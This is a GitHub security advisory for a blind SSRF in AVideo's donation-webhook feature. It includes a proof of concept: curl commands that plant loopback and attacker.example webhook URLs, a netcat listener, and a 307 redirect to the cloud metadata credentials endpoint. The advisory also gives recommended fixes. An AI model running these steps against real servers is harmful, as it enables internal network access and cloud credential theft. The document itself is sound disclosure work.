# [M] AVideo has Blind SSRF in YPTWallet Donation Webhook via Missing isSSRFSafeURL() Check and CURLOPT_FOLLOWLOCATION Redirect Bypass

## Summary
Severity: Medium
Advisory: GHSA-wp38-whx3-xffh
CVE: CVE-2026-43879
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-wp38-whx3-xffh
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

An authenticated user can configure their own donation-notification webhook URL to point at internal/loopback/metadata hosts (e.g. `http://127.0.0.1:8080/...`, `http://169.254.169.254/latest/...`, RFC1918 addresses). When any other user (including a second account owned by the same attacker) donates even a trivial amount via `plugin/CustomizeUser/donate.json.php`, the AVideo server issues a `curl` POST to the attacker-supplied URL, resulting in a blind SSRF. The handler uses only `isValidURL()` (which is a format check) and does not call the codebase's own `isSSRFSafeURL()` helper. Additionally, `CURLOPT_FOLLOWLOCATION` is enabled with no per-hop revalidation, so even if the stored URL were validated, an HTTP 307 from an attacker-controlled host could redirect the POST to internal targets.

## Details

### Sink: unvalidated curl POST in afterDonation

`plugin/YPTWallet/YPTWallet.php:1043-1099`

```php
public function afterDonation($from_users_id, $how_much, $videos_id, $users_id, $extraParameters)
{
    ...
    $donation_notification_url = self::getDonationNotificationURL($users_id);
    ...
    if (!empty($donation_notification_url) && isValidURL($donation_notification_url)) {
        ...
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $donation_notification_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 1);
        curl_setopt($ch, CURLOPT_NOSIGNAL, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);   // line 1081
        ...
        ob_start();
        curl_exec($ch);
        ob_end_clean();
```

The gate at line 1064 is `isValidURL()` only. That helper is a pure format check:

`objects/functions.php:4305-4315`

```php
function isValidURL($url)
{
    if (empty($url) || !is_string($url)) {
        return false;
    }
    if (preg_match("/^http.*/", $url) && filter_var($url, FILTER_VALIDATE_URL)) {
        return true;
    }
    return false;
}
```

It does not reject `http://127.0.0.1`, `http://169.254.169.254`, RFC1918 ranges, or hostnames that resolve to private IPs.

The project already ships a correct SSRF guard at `objects/functions.php:4366` (`isSSRFSafeURL()`), which performs scheme allow-listing, hostname-to-IP resolution, loopback blocking, RFC1918 / link-local / metadata blocking, and IPv4-mapped IPv6 normalization. It is not used here.

### Storage path has no SSRF validation

`plugin/YPTWallet/view/saveConfiguration.php:31-33`

```php
if(isset($_REQUEST['donation_notification_url'])){
     $obj->donation_notification_url = YPTWallet::setDonationNotificationURL(User::getId(), $_REQUEST['donation_notification_url']);
}
```

`plugin/YPTWallet/YPTWallet.php:1015-1034`

```php
static function setDonationNotificationURL($users_id, $url)
{
    $url = trim($url);
    $url = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/', '', $url);
    $url = htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
    if (strlen($url) > 2048) { ... }
    $user = new User($users_id);
    return $user->addExternalOptions('donation_notification_url', $url);
}
```

No host/IP/scheme validation. A value like `http://127.0.0.1:8080/internal` contains none of `& < > " '`, so `htmlspecialchars` preserves it verbatim.

### Trigger

`plugin/CustomizeUser/donate.json.php:88,108`

```php
if (YPTWallet::transferBalance(User::getId(), $video->getUsers_id(), $value, ...)) {
    ...
    AVideoPlugin::afterDonation(User::getId(), $value, $videos_id, 0, $obj->extraParameters);
}
...
if (YPTWallet::transferBalance(User::getId(), $users_id, $value, ...)) {
    ...
    AVideoPlugin::afterDonation(User::getId(), $value, 0, $users_id, $obj->extraParameters);
}
```

Donor must have wallet balance; captcha is required unless `disableCaptchaOnWalletDirectTransferDonation` is set. An attacker can use two accounts they control: the recipient configures the webhook, the donor (any balance they obtained) triggers the call with a trivial transfer.

### FOLLOWLOCATION bypass

Even if `isSSRFSafeURL()` were added to the upfront check on the stored URL, `CURLOPT_FOLLOWLOCATION=true` with no per-redirect host validation allows the attacker to point the webhook at an external host they control and return HTTP 307, which preserves the POST method and forwards the body to e.g. `http://169.254.169.254/latest/...` or any RFC1918 endpoint.

### What escapes to the internal request

The POST body is `http_build_query($data)` where `$data` contains `from_users_id`, `from_users_name`, `currency`, `how_much_human`, `how_much`, `message` (attacker-controlled from the donate.json.php request), `videos_id`, `users_id`, `time`, and `extraParameters`. Headers include `X-Webhook-Signature: sha256=...` and `X-Webhook-Timestamp`. The response is discarded (`ob_start` / `ob_end_clean`, return value ignored), so this is a **blind** SSRF — exfiltration must use out-of-band channels.

## PoC

Prerequisites: two authenticated accounts on the target — Alice (attacker/recipient of donation) and Bob (attacker's second account with a small wallet balance). Captcha is assumed enabled (default).

Step 1 — Alice stores an internal-host webhook URL. No CSRF token is required on this endpoint:

```bash
curl -sS -b cookies_alice.txt -X POST 'https://target/plugin/YPTWallet/view/saveConfiguration.php' \
  --data-urlencode 'donation_notification_url=http://127.0.0.1:8080/internal/admin/action' \
  --data-urlencode 'CryptoWallet='
```

Response body includes the stored `donation_notification_url` plus Alice's `webhook_secret` (the signature is computed with Alice's own secret, so there is no cross-user signature leak).

Step 2 — Start a listener on the target host to observe the blind request:

```bash
# On the target server
nc -lvp 8080
```

Step 3 — Bob donates the minimum amount to Alice (captcha solved):

```bash
curl -sS -b cookies_bob.txt -X POST 'https://target/plugin/CustomizeUser/donate.json.php' \
  --data 'value=0.01&users_id=<alice_user_id>&message=x&captcha=<solved_value>'
```

`donate.json.php:108` calls `AVideoPlugin::afterDonation(...)`.

Step 4 — Observe the netcat listener: the AVideo server issues:

```
POST /internal/admin/action HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: <AVideo UA>
Content-Type: application/x-www-form-urlencoded
X-Webhook-Signature: sha256=<hmac>
X-Webhook-Timestamp: <epoch>
Content-Length: ...

from_users_id=<bob>&from_users_name=...&currency=...&how_much_human=...&how_much=0.01&message=x&videos_id=0&users_id=<alice>&time=...&extraParameters[...]=...
```

Confirmed: the vulnerable server reaches the loopback port on behalf of the attacker.

Step 5 — FOLLOWLOCATION bypass. Alice registers an external URL she controls:

```bash
curl -sS -b cookies_alice.txt -X POST 'https://target/plugin/YPTWallet/view/saveConfiguration.php' \
  --data-urlencode 'donation_notification_url=https://attacker.example/r' \
  --data-urlencode 'CryptoWallet='
```

Alice's web server at `attacker.example/r` responds to the POST with:

```
HTTP/1.1 307 Temporary Redirect
Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Because `CURLOPT_FOLLOWLOCATION=true` and HTTP 307 preserves method, the AVideo host re-issues the POST to the cloud metadata endpoint. This demonstrates that any future fix that only validates the stored URL (without disabling follow-redirects or validating each hop) remains bypassable.

## Impact

- **Blind SSRF from authenticated low-privileged users.** An attacker reaches internal-only network resources from the AVideo server: loopback services, RFC1918 hosts on the same VPC, cloud metadata endpoints, and any other host the AVideo server can route to.
- **State-changing POST to internal endpoints.** Because the request method is fixed to POST and the body is attacker-influenced (the `message` field is user-supplied), an attacker can trigger POST-handled internal admin endpoints, Redis/memcached HTTP-ish consoles, or webhook receivers that accept arbitrary POST bodies.
- **Cloud metadata reachability via 307 redirect chain.** Follow-location support enables redirection into RFC1918 / 169.254.169.254 even if stored-URL validation is later added. Metadata endpoints that accept POST (or GET-via-redirect once the chain involves a 302/303 downgrade) become reachable.
- **Blindness limits direct data exfiltration** (the response is discarded) but does not prevent state-changing requests, port-probe timing, or DNS-rebinding timing side channels.
- **No CSRF protection** on `saveConfiguration.php`, so this can also be compounded with a forced-browsing or CSRF vector against an authenticated user to plant the webhook on a victim's account.

## Recommended Fix

1. Call `isSSRFSafeURL()` on both the store path and the dispatch path. In `plugin/YPTWallet/YPTWallet.php:1015` (setter) and line 1064 (dispatcher), replace:

```php
if (!empty($donation_notification_url) && isValidURL($donation_notification_url)) {
```

with:

```php
$resolvedIP = null;
if (!empty($donation_notification_url) && isSSRFSafeURL($donation_notification_url, $resolvedIP)) {
```

and reject the URL in `setDonationNotificationURL()` before persisting:

```php
static function setDonationNotificationURL($users_id, $url)
{
    $url = trim($url);
    $url = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/', '', $url);
    if (!isSSRFSafeURL($url)) {
        _error_log("setDonationNotificationURL: rejected SSRF-unsafe URL for user {$users_id}");
        return false;
    }
    if (strlen($url) > 2048) { ... }
    $url = htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
    ...
}
```

2. Disable automatic redirect following, or implement per-hop validation. Either:

```php
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
```

Or use `CURLOPT_REDIR_PROTOCOLS` limited to `CURLPROTO_HTTP | CURLPROTO_HTTPS` **and** pin DNS via `CURLOPT_RESOLVE` using the `$resolvedIP` from `isSSRFSafeURL()`, then follow redirects manually by re-validating each `Location:` header with `isSSRFSafeURL()` before re-issuing the request.

3. Add DNS-pinning to defeat DNS rebinding between the validation and the curl call:

```php
$parts = parse_url($donation_notification_url);
$port = $parts['port'] ?? (($parts['scheme'] ?? 'http') === 'https' ? 443 : 80);
curl_setopt($ch, CURLOPT_RESOLVE, ["{$parts['host']}:{$port}:{$resolvedIP}"]);
```

4. Add a CSRF/global-token check on `plugin/YPTWallet/view/saveConfiguration.php` (consistent with the token validation added elsewhere in the codebase in commit `11e7804f7`) to prevent webhook planting via CSRF on a victim's authenticated session.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-wp38-whx3-xffh
- https://nvd.nist.gov/vuln/detail/CVE-2026-43879
- https://github.com/WWBN/AVideo/commit/aaacd48f29f1ff71d1eb5fc81d37605f593cefa9
- https://github.com/WWBN/AVideo
